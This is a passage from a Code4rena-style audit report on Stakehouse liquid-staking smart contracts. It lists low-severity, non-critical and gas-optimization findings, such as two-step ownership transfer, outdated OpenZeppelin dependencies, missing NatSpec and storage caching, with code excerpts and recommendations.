import { ERC20PermitUpgradeable } from \"@openzeppelin/contracts-upgradeable/token/ERC20/extensions/draft-ERC20PermitUpgradeable.sol\";\n```\n\n## [L-02] Stack too deep when compiling\n\nThe project cannot be compiled due to the \"stack too deep\" error.\n\nThe “stack too deep” error is a limitation of the current code generator. The EVM stack only has 16 slots and that’s sometimes not enough to fit all the local variables, parameters and/or return variables. The solution is to move some of them to memory, which is more expensive but at least makes your code compile.\n\n```js\n[⠒] Compiling...\n[⠰] Compiling 100 files with 0.8.13\n[⠔] Solc 0.8.13 finished in 3.35s\nError: \nCompiler run failed\nCompilerError: Stack too deep when compiling inline assembly: Variable headStart is 1 slot(s) too deep inside the stack.\n```\n\nref:https://forum.openzeppelin.com/t/stack-too-deep-when-compiling-inline-assembly/11391/6\n\n## [L-03] Remove unused code\n\nThis code is not used in the project, remove it or add event-emit;\n\n```solidity\ncontracts/liquid-staking/GiantPoolBase.sol:\n\n  100:     function _onDepositETH() internal virtual {}\n  103:     function _onWithdraw(LPToken[] calldata _lpTokens) internal virtual {}\n  104  }\n```\n## [L-04] Insufficient coverage\n\n**Description:**<br>\nTesting all functions is best practice in terms of security criteria.\n\nThis function test coverage is not found in test files\n\n```solidity\n function rawExecute(\n        address target,\n        bytes memory callData,\n        uint256 value\n    )\n    external\n    override\n    payable\n    onlyOwner\n    returns (bytes memory)\n    {\n        (bool result, bytes memory message) = target.call{value: value}(callData);\n        require(result, \"Failed to execute\");\n        return message;\n    }\n```\n\nDue to its capacity, test coverage is expected to be 100%\n\n## [L-05] Critical Address Changes Should Use Two-step Procedure\n\nThe critical procedures should be two step process.\n\n```solidity\n\ncontracts/smart-wallet/OwnableSmartWallet.sol:\n   94:     function transferOwnership(address newOwner)\n   95:         public\n   96:         override(IOwnableSmartWallet, Ownable)\n   97:     {\n```\n\n**Recommended Mitigation Steps:**<br>\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n## [L-06] Owner can renounce Ownership\n\n**Context:**\n\n[LiquidStakingManager.sol#L6](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L6)<br>\n[Syndicate.sol#L8](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L8)\n\n**Description:**<br>\nTypically, the contract’s owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.\n\nThe StakeHouse Ownable used in this project contract implements renounceOwnership. This can represent a certain risk if the ownership is renounced for any other reason than by design. Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.\n\n\n`onlyOwner` functions;\n```solidity\n8 results - 2 files\n\ncontracts/smart-wallet/OwnableSmartWallet.sol:\n   44          payable\n   45:         onlyOwner // F: [OSW-6A]\n   46          returns (bytes memory)\n\n   59          payable\n   60:         onlyOwner // F: [OSW-6A]\n   61          returns (bytes memory)\n\n   74      payable\n   75:     onlyOwner\n   76      returns (bytes memory)\n\n  114:     function setApproval(address to, bool status) external onlyOwner override {\n\ncontracts/syndicate/Syndicate.sol:\n  147:     ) external onlyOwner {\n\n  154:     function deRegisterKnots(bytes[] calldata _blsPublicKeys) external onlyOwner {\n\n  161:     function addPriorityStakers(address[] calldata _priorityStakers) external onlyOwner {\n\n  168:     function updatePriorityStakingBlock(uint256 _endBlock) external onlyOwner {\n```\n\n**Recommendation:**<br>\nWe recommend to either reimplement the function to disable it or to clearly specify if it is part of the contract design.\n\n## [L-07] Loss of precision due to rounding\n\nDue to `/ PRECISION`, users can avoid paying fee if ` claimed [][]` result is below PRECISION\n\n```solidity\ncontracts/liquid-staking/GiantMevAndFeesPool.sol:\n  199  \n  200:     /// @dev Internal re-usable method for setting claimed to max for msg.sender\n  201:     function _setClaimedToMax(address _user) internal {\n  202:         // New ETH stakers are not entitled to ETH earned by\n  203:         claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n  204:     }\n```\n\n**Recommendation:**<br>\nA lower limit can be added to the `claimed` values\n\n## [L-08] Using vulnerable dependency of OpenZeppelin\n\nThe package.json configuration file says that the project is using 4.5.0 of OZ which has a not last update version\n\n```js\n1 result - 1 file\n\npackage.json:\n  10:   \"dependencies\": {\n  14:     \"@openzeppelin/contracts\": \"^4.5.0\",\n  15:     \"@openzeppelin/contracts-upgradeable\": \"4.5.0\",\n```\n```js\nVULNERABILITY\tVULNERABLE VERSION\nH    \tImproper Verification of Cryptographic Signature\t<4.7.3\nM   \tDenial of Service (DoS)\t>=2.3.0 <4.7.2\nL     \tIncorrect Resource Transfer Between Spheres\t >=4.6.0 <4.7.2\nH\tIncorrect Calculation\t>=4.3.0 <4.7.2\nH\tInformation Exposure\t>=4.1.0 <4.7.1\nH\tInformation Exposure\t>=4.0.0 <4.7.1\n```\n\n**Recommendation:**<br>\nUse patched versions<br>\nLatest non vulnerable version 4.8.0\n\n## [L-09] Use ```safeTransferOwnership``` instead of ```transferOwnership``` function\n\n**Context:**<br>\n[LiquidStakingManager.sol#L6](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L6)<br>\n[Syndicate.sol#L8](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L8)\n\n\n```solidity\ncontracts/smart-wallet/OwnableSmartWallet.sol:\n   93      /// @inheritdoc IOwnableSmartWallet\n   94:     function transferOwnership(address newOwner)\n   95:         public\n   96:         override(IOwnableSmartWallet, Ownable)\n   97:     {\n   98:         // Only the owner themselves or an address that is approved for transfers\n   99:         // is authorized to do this\n  100:         require(\n  101:             isTransferApproved(owner(), msg.sender),\n  102:             \"OwnableSmartWallet: Transfer is not allowed\"\n  103:         ); // F: [OSW-4]\n  104: \n  105:         // Approval is revoked, in order to avoid unintended transfer allowance\n  106:         // if this wallet ever returns to the previous owner\n  107:         if (msg.sender != owner()) {\n  108:             _setApproval(owner(), msg.sender, false); // F: [OSW-5]\n  109:         }\n  110:         _transferOwnership(newOwner); // F: [OSW-5]\n  111:     }\n```\n\n**Description:**<br>\n```transferOwnership``` function is used to change Ownership\n\nUse a 2 structure transferOwnership which is safer.<br>\n```safeTransferOwnership```,  use it is more secure due to 2-stage ownership transfer.\n\n**Recommendation:**<br>\nUse ``Ownable2Step.sol``<br>\n[Ownable2Step.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol)\n\n```js\n /**\n     * @dev The new owner accepts the ownership transfer.\n     */\n    function acceptOwnership() external {\n        address sender = _msgSender();\n        require(pendingOwner() == sender, \"Ownable2Step: caller is not the new owner\");\n        _transferOwnership(sender);\n    }\n}\n```\n\n## [N-01] `0 address` check\n\n0 address control should be done in these parts;\n\n**Context:**<br>\n[GiantLP.sol#L20-L21](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantLP.sol#L20-L21)<br>\n[LiquidStakingManager.sol#L170-L177](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L170-L177)<br>\n[LPToken.sol#L33-L34](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LPToken.sol#L33-L34)<br>\n[OptionalHouseGatekeeper.sol#L15](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/OptionalHouseGatekeeper.sol#L15)<br>\n[SavETHVault.sol#L45](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L45)<br>\n[Syndicate.sol#L130](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L130)<br>\n[SyndicateFactory.sol#L17](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/SyndicateFactory.sol#L17)\n\n**Recommendation:**<br>\nAdd code like this;<br>\n`if (oracle == address(0)) revert ADDRESS_ZERO();`\n\n## [N-02] Add parameter to Event-Emit\n\nSome event-emit description hasn’t parameter. Add to parameter  for front-end website or client app , they can has that something has happened on the blockchain.\n\n\n```solidity\ncontracts/syndicate/Syndicate.sol:\n  468      /// @dev Internal logic for initializing the syndicate contract\n  469:     function _initialize(\n  470:         address _contractOwner,\n  471:         uint256 _priorityStakingEndBlock,\n  472:         address[] memory _priorityStakers,\n  473:         bytes[] memory _blsPubKeysForSyndicateKnots\n  474:     ) internal {\n  475:         // Transfer ownership from the deployer to the address specified as the owner\n  476:         _transferOwnership(_contractOwner);\n  477: \n  478:         // Add the initial set of knots to the syndicate\n  479:         _registerKnotsToSyndicate(_blsPubKeysForSyndicateKnots);\n  480: \n  481:         // Optionally process priority staking if the required params and array is configured\n  482:         if (_priorityStakingEndBlock > block.number) {\n  483:             priorityStakingEndBlock = _priorityStakingEndBlock;\n  484:             _addPriorityStakers(_priorityStakers);\n  485:         }\n  486: \n  487:         emit ContractDeployed();\n  488:     }\n```\n\n## [N-03] Omissions in Events\n\nThroughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, some events are missing important parameters\n\nThe events should include the new value and old value where possible:\n\nEvents with no old value;\n\n```solidity\n\ncontracts/liquid-staking/LiquidStakingManager.sol:\n  254      /// @notice Allow the DAO to rotate the network ticker before the network house is created\n  255:     function updateTicker(string calldata _newTicker) external onlyDAO {\n  256:         require(bytes(_newTicker).length >= 3, \"String must be 3-5 characters long\");\n  257:         require(bytes(_newTicker).length <= 5, \"String must be 3-5 characters long\");\n  258:         require(numberOfKnots == 0, \"Cannot change ticker once house is created\");\n  259: \n  260:         stakehouseTicker = _newTicker;\n  261: \n  262:         emit NetworkTickerUpdated(_newTicker);\n  263      }\n```\n\n## [N-04] Include ``return parameters`` in _NatSpec comments_\n\n**Context:**<br>\nAll Contracts\n\n**Description:**<br>\nhttps://docs.soliditylang.org/en/v0.8.15/natspec-format.html\n\nIf Return parameters are declared, you must prefix them with `/// @return`.\n\nSome code analysis programs do analysis by reading NatSpec details, if they can't see the \"@return\" tag, they do incomplete analysis.\n\n**Recommendation:**<br>\nInclude return parameters in NatSpec comments\n\nRecommendation Code Style:\n ```js\n    /// @notice information about what a function does\n    /// @param pageId The id of the page to get the URI for.\n    /// @return Returns a page's URI if it has been minted \n    function tokenURI(uint256 pageId) public view virtual override returns (string memory) {\n        if (pageId == 0 || pageId > currentId) revert(\"NOT_MINTED\");\n\n        return string.concat(BASE_URI, pageId.toString());\n    }\n```\n## [N-05] Use a more recent version of Solidity\n\n**Context:**<br>\nAll contracts\n\n**Description:**<br>\nFor security, it is best practice to use the latest Solidity version.<br>\nFor the security fix list in the versions;<br>\nhttps://github.com/ethereum/solidity/blob/develop/Changelog.md\n\n**Recommendation:**<br>\nOld version of Solidity is used `(^0.8.13)`, newer version can be used `(0.8.17)`\n\n## [N-06] Solidity compiler optimizations can be problematic\n\n```js\nhardhat.config.js:\n   3  \n   4: module.exports = {\n   5:   solidity: {\n   6:     version: \"0.8.13\",\n   7:     settings: {\n   8:       optimizer: {\n   9:         enabled: true,\n  10:         runs: 200\n  11:       }\n```\n\n**Description:**<br>\nProtocol has enabled optional compiler optimizations in Solidity.<br>\nThere have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. \n\nTherefore, it is unclear how well they are being tested and exercised.<br>\nHigh-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. \n\nAnother high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported.<br>\nA compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe.<br>\nIt is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.\n\n**Exploit Scenario**<br>\nA latent or future bug in Solidity compiler optimizations—or in the Emscripten transpilation to solc-js—causes a security vulnerability in the contracts.\n\n**Recommendation:**<br>\nShort term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug.<br>\nLong term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.\n\n## [N-07] NatSpec is missing \n\n**Description:**<br>\nNatSpec is missing for the following functions , constructor and modifier:\n\n```solidity\n\n27 results\n\ncontracts/interfaces/IBrandNFT.sol:\n  6:     function toLowerCase(string memory _base) external pure returns (string memory);\n  7:     function lowercaseBrandTickerToTokenId(string memory _ticker) external returns (uint256);\n\ncontracts/interfaces/ILiquidStakingManager.sol:\n  7:     function stakehouse() external view returns (address);\n\ncontracts/interfaces/ILiquidStakingManagerChildContract.sol:\n  6:     function liquidStakingManager() external view returns (address);\n\ncontracts/interfaces/ILPTokenInit.sol:\n  7:     function init(\n\ncontracts/interfaces/ISyndicateInit.sol:\n  7:     function initialize(\n\ncontracts/interfaces/ITransferHookProcessor.sol:\n  6:     function beforeTokenTransfer(address _from, address _to, uint256 _amount) external;\n  7:     function afterTokenTransfer(address _from, address _to, uint256 _amount) external;\n\ncontracts/liquid-staking/GiantLP.sol:\n  29:     function mint(address _recipient, uint256 _amount) external {\n  34:     function burn(address _recipient, uint256 _amount) external {\n  39:     function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override {\n  43:     function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {\n\ncontracts/liquid-staking/OptionalGatekeeperFactory.sol:\n  11:     function deploy(address _liquidStakingManager) external returns (OptionalHouseGatekeeper) {\n\ncontracts/liquid-staking/SavETHVault.sol:\n   45:     function init(address _liquidStakingManagerAddress, LPTokenFactory _lpTokenFactory) external virtual initializer {\n\ncontracts/liquid-staking/SavETHVaultDeployer.sol:\n  18:     function deploySavETHVault(address _liquidStakingManger, address _lpTokenFactory) external returns (address) {\n\ncontracts/smart-wallet/OwnableSmartWalletFactory.sol:\n  28:     function createWallet() external returns (address wallet) {\n  32:     function createWallet(address owner) external returns (address wallet) {\n  36:     function _createWallet(address owner) internal returns (address wallet) {\n\ncontracts/smart-wallet/interfaces/IOwnableSmartWalletFactory.sol:\n   9:     function createWallet() external returns (address wallet);\n  11:     function createWallet(address owner) external returns (address wallet);\n  13:     function walletExists(address wallet) external view returns (bool);\n\ncontracts/testing/interfaces/IFactoryDependencyInjector.sol:\n   6:     function accountMan() external view returns (address);\n   8:     function txRouter() external view returns (address);\n  10:     function uni() external view returns (address);\n  12:     function slot() external view returns (address);\n  14:     function saveETHRegistry() external view returns (address);\n  16:     function dETH() external view returns (address);\n```\n## [N-08] Lines are too long\n\nUsually lines in source code are limited to 80 characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over 164 characters, the lines below should be split when they reach that length.<br>\nReference: https://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length\n\n```solidity\n9 results\n\ncontracts/syndicate/Syndicate.sol:\n  216:             if (!isKnotRegistered[_blsPubKey] || isNoLongerPartOfSyndicate[_blsPubKey]) revert KnotIsNotRegisteredWithSyndicate();\n\n  447:         return ((calculateETHForFreeFloatingOrCollateralizedHolders() - lastSeenETHPerCollateralizedSlotPerKnot) / numberOfRegisteredKnots);\n\n 511:                     accruedEarningPerCollateralizedSlotOwnerOfKnot[_blsPubKey][collateralizedOwnerAtIndex] += unprocessedETHForCurrentKnot;\n\ncontracts/liquid-staking/ETHPoolLPFactory.sol:\n  92:             getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n\n  97:             getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfNewKnot) ==IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n\ncontracts/liquid-staking/GiantLP.sol:\n  40:         if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).beforeTokenTransfer(_from, _to, _amount);\n\n  46:         if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount);\n\ncontracts/liquid-staking/GiantMevAndFeesPool.sol:\n   97:         return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n\n  118:             StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n```\n## [N-09] Missing Event for critical parameters change\n\n```solidity\ncontracts/smart-wallet/OwnableSmartWallet.sol:\n  66      /// @inheritdoc IOwnableSmartWallet\n  67:     function rawExecute(\n  68:         address target,\n  69:         bytes memory callData,\n  70:         uint256 value\n  71:     )\n  72:     external\n  73:     override\n  74:     payable\n  75:     onlyOwner\n  76:     returns (bytes memory)\n  77:     {\n  78:         (bool result, bytes memory message) = target.call{value: value}(callData);\n  79:         require(result, \"Failed to execute\");\n  80:         return message;\n  81:     }\n```\n\n**Description:**<br>\nEvents help non-contract tools to track changes, and events prevent users from being surprised by changes\n\n**Recommendation:**<br>\nAdd Event-Emit\n\n## [N-10] Add to indexed parameter for countable Events\n\n**Context:**<br>\n```solidity\ncontracts/liquid-staking/ETHPoolLPFactory.sol:\n  15      /// @notice signalize withdrawing of ETH by depositor\n  16:     event ETHWithdrawnByDepositor(address depositor, uint256 amount);\n  17: \n  18:     /// @notice signalize burning of LP token\n  19:     event LPTokenBurnt(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n  20: \n  21:     /// @notice signalize issuance of new LP token\n  22:     event NewLPTokenIssued(bytes blsPublicKeyOfKnot, address token, address firstDepositor, uint256 amount);\n  23: \n  24:     /// @notice signalize issuance of existing LP token\n  25:     event LPTokenMinted(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n```\n\n**Description:**<br>\nAdd to indexed parameter for countable Events\n\n**Recommendation:**<br>\nAdd Event-Emit\n\n## [N-11] NatSpec comments should be increased in contracts\n\n**Context:**<br>\nAll Contracts\n\n**Description:**<br>\nIt is recommended that Solidity contracts are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation.<br>\nIn complex projects such as Defi, the interpretation of all functions and their arguments and returns is important for code readability and auditability.<br>\nhttps://docs.soliditylang.org/en/v0.8.15/natspec-format.html\n\n**Recommendation:**<br>\nNatSpec comments should be increased in contracts\n\n## [N-12] Open TODOs\n\n**Context:**\n```solidity\n1 result\n\ncontracts/syndicate/Syndicate.sol:\n  194          } else {\n  195:             // todo - check else case for any ETH lost\n  196          }\n```\n\n**Recommendation:**<br>\nUse temporary TODOs as you work on a feature, but make sure to treat them before merging. Either add a link to a proper issue in your TODO, or remove it from the code.\n\n## [N-13] `Empty blocks` should be _removed_ or _Emit_ something\n\n**Description:**<br>\nCode contains empty block\n\n```js\n10 results - 8 files\n\ncontracts/liquid-staking/GiantPoolBase.sol:\n  101:     function _onDepositETH() internal virtual {}\n  104:     function _onWithdraw(LPToken[] calldata _lpTokens) internal virtual {}\n  \ncontracts/liquid-staking/LiquidStakingManager.sol:\n  166:     constructor() initializer {}\n  629:     receive() external payable {}\n\ncontracts/liquid-staking/LPToken.sol:\n  28:     constructor() initializer {}\n \ncontracts/liquid-staking/SavETHVault.sol:\n  43:     constructor() initializer {}\n  \ncontracts/liquid-staking/StakingFundsVault.sol:\n  43:     constructor() initializer {}\n  \ncontracts/liquid-staking/SyndicateRewardsProcessor.sol:\n  98:     receive() external payable {}\n\ncontracts/smart-wallet/OwnableSmartWallet.sol:\n  25:     constructor() initializer {}\n  \ncontracts/syndicate/Syndicate.sol:\n  123:     constructor() initializer {}\n```\n\n**Recommendation:**<br>\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.\n\n## [N-14] Avoid variable names that can shade\n\nWith global variable names in the form of  `call{value: value }` , argument name similarities can shade and negatively affect code readability.\n\n```solidity\n\ncontracts/smart-wallet/OwnableSmartWallet.sol:\n  77:     {\n  78:         (bool result, bytes memory message) = target.call{value: value}(callData);\n  79:         require(result, \"Failed to execute\");\n  80:         return message;\n  81:     }\n```\n\n## [N-15] Use a more recent version of Solidity\n\n**Context:**<br>\nAll contracts\n\n**Description:**<br>\nFor security, it is best practice to use the latest Solidity version.<br>\nFor the security fix list in the versions;<br>\nhttps://github.com/ethereum/solidity/blob/develop/Changelog.md\n\n**Recommendation:**<br>\nOld version of Solidity is used `(0.8.13)`, newer version can be used `(0.8.17)`\n\n## [N-16] _Lock pragmas_ to specific compiler version\n\n**Description:**<br>\nPragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or EthPM package. Otherwise, the developer would need to manually update the pragma in order to compile locally.<br>\nhttps://swcregistry.io/docs/SWC-103\n\n**Recommendation:**<br>\nEthereum Smart Contract Best Practices - Lock pragmas to specific compiler version.<br>\n[solidity-specific/locking-pragmas](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/locking-pragmas/)\n\n```solidity\n24 files\n\npragma solidity ^0.8.13;\ncontracts/interfaces/IBrandNFT.sol:\ncontracts/interfaces/ILiquidStakingManagerChildContract.sol:\ncontracts/interfaces/ILPTokenInit.sol:\ncontracts/interfaces/ISyndicateFactory.sol:\ncontracts/interfaces/ISyndicateInit.sol:\ncontracts/interfaces/ITransferHookProcessor.sol:\ncontracts/liquid-staking/ETHPoolLPFactory.sol:\ncontracts/liquid-staking/GiantLP.sol:\ncontracts/liquid-staking/GiantMevAndFeesPool.sol:\ncontracts/liquid-staking/GiantPoolBase.sol:\ncontracts/liquid-staking/GiantSavETHVaultPool.sol:\ncontracts/liquid-staking/LiquidStakingManager.sol:\ncontracts/liquid-staking/LPToken.sol:\ncontracts/liquid-staking/LPTokenFactory.sol:\ncontracts/liquid-staking/LSDNFactory.sol:\ncontracts/liquid-staking/OptionalGatekeeperFactory.sol:\ncontracts/liquid-staking/OptionalHouseGatekeeper.sol:\ncontracts/liquid-staking/SavETHVault.sol:\ncontracts/liquid-staking/SavETHVaultDeployer.sol:\ncontracts/liquid-staking/StakingFundsVault.sol:\ncontracts/liquid-staking/StakingFundsVaultDeployer.sol:\ncontracts/liquid-staking/SyndicateRewardsProcessor.sol:\ncontracts/smart-wallet/OwnableSmartWallet.sol:\ncontracts/smart-wallet/OwnableSmartWalletFactory.sol:\n```\n\n## [S-01] Generate perfect code headers every time\n\n**Description:**<br>\nI recommend using header for Solidity code layout and readability\n\nhttps://github.com/transmissions11/headers\n\n```js\n/*//////////////////////////////////////////////////////////////\n                           TESTING 123\n//////////////////////////////////////////////////////////////*/\n```\n\n**[vince0656 (Stakehouse) commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/403#issuecomment-1330713505):**\n > Good quality\n\n\n\n***\n\n# Gas Optimizations\n\nFor this contest, 18 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/331) by **IllIllI** received the top score from the judge.\n\n*The following wardens also submitted reports: [Deivitto](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/409), [0xSmartContract](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/397), [ignacio](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/391), [lukris02](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/389), [c3phas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/384), [CloudX](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/334), [brgltd](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/323), [Aymen0909](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/318), [tnevler](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/304), [btk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/270), [bharg4v](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/235), [Awesome](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/192), [chrisdior4](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/156), [imare](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/125), [Saintcode\\_](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/62), [skyle](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/51), and [ReyAdmirado](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/37).*\n\n\n## Summary\n\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;01] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate | 1 | - |\n| [G&#x2011;02] | State variables only set in the constructor should be declared `immutable` | 33 | 31201 |\n| [G&#x2011;03] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 8 | 960 |\n| [G&#x2011;04] | State variables should be cached in stack variables rather than re-reading them from storage | 16 | 1552 |\n| [G&#x2011;05] | The result of function calls should be cached rather than re-calling the function | 1 | - |\n| [G&#x2011;06] | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables | 16 | 1808 |\n| [G&#x2011;07] | `internal` functions only called once can be inlined to save gas | 9 | 180 |\n| [G&#x2011;08] | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 38 | 2280 |\n| [G&#x2011;09] | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 39 | - |\n| [G&#x2011;10] | Optimize names to save gas | 16 | 352 |\n| [G&#x2011;11] | `internal` functions not called by the contract should be removed to save deployment gas | 2 | - |\n| [G&#x2011;12] | Don't compare boolean expressions to boolean literals | 19 | 171 |\n| [G&#x2011;13] | Ternary unnecessary | 1 | - |\n| [G&#x2011;14] | Division by two should use bit shifting | 1 | 20 |\n| [G&#x2011;15] | Stack variable used as a cheaper cache for a state variable is only used once | 1 | 3 |\n| [G&#x2011;16] | Empty blocks should be removed or emit something | 1 | - |\n| [G&#x2011;17] | Use custom errors rather than `revert()`/`require()` strings to save gas | 21 | - |\n| [G&#x2011;18] | Functions guaranteed to revert when called by normal users can be marked `payable` | 20 | 420 |\n\nTotal: 243 instances over 18 issues with **38947 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.\n\n## [G&#x2011;01] Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate\nSaves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/liquid-staking/LiquidStakingManager.sol\n\n134       /// @notice Node runner issued to Smart wallet. Smart wallet address <> Node runner address\n135       mapping(address => address) public nodeRunnerOfSmartWallet;\n136   \n137       /// @notice Track number of staked KNOTs of a smart wallet\n138:      mapping(address => uint256) public stakedKnotsOfSmartWallet;\n\n```\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/liquid-staking/LiquidStakingManager.sol#L134-L138\n\n## [G&#x2011;02] State variables only set in the constructor should be declared `immutable`\nAvoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**). \n\nWhile `string`s are not value types, and therefore cannot be `immutable`/`constant` if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract `abstract` with `virtual` functions for the `string` accessors, and having a child contract override the functions with the hard-coded implementation-specific values.\n\n*There are 33 instances of this issue. **(For in-depth details on this and all further gas optimizations with multiple instances, see the warden's [full report](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/331).)***\n\n## [G&#x2011;03] Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas\nWhen a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved\n\n*There are 8 instances of this issue.*\n\n## [G&#x2011;04] State variables should be cached in stack variables rather than re-reading them from storage\nThe instances in this report point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 16 instances of this issue.*\n\n## [G&#x2011;05] The result of function calls should be cached rather than re-calling the function\nThe instances in this report point to the second+ call of the function within a single function.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/liquid-staking/StakingFundsVault.sol\n\n/// @audit liquidStakingNetworkManager.syndicate() on line 215\n219:                      liquidStakingNetworkManager.syndicate(),\n\n```\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/fac28671afb64b065fc7ffd10d730fe20264bc31/contracts/liquid-staking/StakingFundsVault.sol#L219\n\n## [G&#x2011;06] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables\nUsing the addition operator instead of plus-equals saves **[113 